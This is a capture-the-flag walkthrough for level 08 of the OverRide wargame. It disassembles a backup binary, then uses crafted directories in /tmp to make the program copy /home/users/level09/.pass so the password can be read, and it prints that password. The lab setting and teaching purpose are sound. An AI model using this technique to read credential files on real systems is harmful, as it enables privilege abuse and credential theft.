# Level 08 Walkthrough

Via running the program we see it asks for a command argument representing a filename.
```
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```

Upon disassembling the program we see that it opens the filename passed as command argument.
```
    0x0000000000400ab3 <+195>:	mov    edx,0x400da9                     // "r"
    0x0000000000400ab8 <+200>:	mov    rax,QWORD PTR [rbp-0xa0]      
    0x0000000000400abf <+207>:	add    rax,0x8
    0x0000000000400ac3 <+211>:	mov    rax,QWORD PTR [rax]              // argv[1]
    0x0000000000400ac6 <+214>:	mov    rsi,rdx
    0x0000000000400ac9 <+217>:	mov    rdi,rax
    0x0000000000400acc <+220>:	call   0x4007c0 <fopen@plt>
    0x0000000000400a5f <+111>:   mov    QWORD PTR [rbp-0x80],rax        // fopen return value
```

It then creates a file with this format `"./backup/" + "filename"`, and write `"filename"`'s content into it.
```
    --------------------------------------------------------------------------
                                     strlen
    --------------------------------------------------------------------------
    0x0000000000400b27 <+311>:	lea    rax,[rbp-0x70]                               // "./backups/"
    0x0000000000400b2b <+315>:	mov    QWORD PTR [rbp-0xa8],0xffffffffffffffff
    0x0000000000400b36 <+326>:	mov    rdx,rax
    0x0000000000400b39 <+329>:	mov    eax,0x0
    0x0000000000400b3e <+334>:	mov    rcx,QWORD PTR [rbp-0xa8]
    0x0000000000400b45 <+341>:	mov    rdi,rdx
    0x0000000000400b48 <+344>:	repnz scas al,BYTE PTR es:[rdi]
    0x0000000000400b4a <+346>:	mov    rax,rcx
    0x0000000000400b4d <+349>:	not    rax
    0x0000000000400b50 <+352>:	lea    rdx,[rax-0x1]
    0x0000000000400b54 <+356>:	mov    eax,0x63
    0x0000000000400b59 <+361>:	mov    rcx,rax
    0x0000000000400b5c <+364>:	sub    rcx,rdx
    0x0000000000400b5f <+367>:	mov    rdx,rcx                                      // The length
    --------------------------------------------------------------------------

    0x0000000000400b62 <+370>:	mov    rax,QWORD PTR [rbp-0xa0]
    0x0000000000400b69 <+377>:	add    rax,0x8
    0x0000000000400b6d <+381>:	mov    rax,QWORD PTR [rax]
    0x0000000000400b70 <+384>:	mov    rcx,rax
    0x0000000000400b73 <+387>:	lea    rax,[rbp-0x70]
    0x0000000000400b77 <+391>:	mov    rsi,rcx                                      // argv[1]
    0x0000000000400b7a <+394>:	mov    rdi,rax                                      // "./backups/"
    0x0000000000400b7d <+397>:	call   0x400750 <strncat@plt>                       // "./backups/ + argv[1]" stored at `rbp-0x70`
    --------------------------------------------------------------------------

    0x0000000000400b82 <+402>:	lea    rax,[rbp-0x70]
    0x0000000000400b86 <+406>:	mov    edx,0x1b0                                    // S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP
    0x0000000000400b8b <+411>:	mov    esi,0xc1                                     // O_CREAT|O_WRONLY|O_EXCL
    0x0000000000400b90 <+416>:	mov    rdi,rax                                      // "./backups/ + argv[1]"
    0x0000000000400b93 <+419>:	mov    eax,0x0
    0x0000000000400b98 <+424>:	call   0x4007b0 <open@plt>
    0x0000000000400b9d <+429>:	mov    DWORD PTR [rbp-0x78],eax                     // FD of "./backups/ + argv[1]"
    --------------------------------------------------------------------------

    0x0000000000400bed <+509>:	nop
    0x0000000000400bee <+510>:	mov    rax,QWORD PTR [rbp-0x80]                     // FD of argv[1]
    0x0000000000400bf2 <+514>:	mov    rdi,rax
    0x0000000000400bf5 <+517>:	call   0x400760 <fgetc@plt>                         // Get one character
    0x0000000000400bfa <+522>:	mov    BYTE PTR [rbp-0x71],al
    0x0000000000400bfd <+525>:	movzx  eax,BYTE PTR [rbp-0x71]
    0x0000000000400c01 <+529>:	cmp    al,0xff                                      // Compare return value if it's -1 meaning we reached the EOF 
    0x0000000000400c03 <+531>:	jne    0x400bd5 <main+485>
    0x0000000000400bd5 <+485>:	lea    rcx,[rbp-0x71]                               // The character read from argv[1] file
    0x0000000000400bd9 <+489>:	mov    eax,DWORD PTR [rbp-0x78]                     // The "./backups/ + argv[1]" FD
    0x0000000000400bdc <+492>:	mov    edx,0x1                                      // How many characters to write
    0x0000000000400be1 <+497>:	mov    rsi,rcx
    0x0000000000400be4 <+500>:	mov    edi,eax
    0x0000000000400be6 <+502>:	call   0x400700 <write@plt>
```

We can exploit this via reading the content of `/home/users/level09/.pass` file.
```
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 

fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```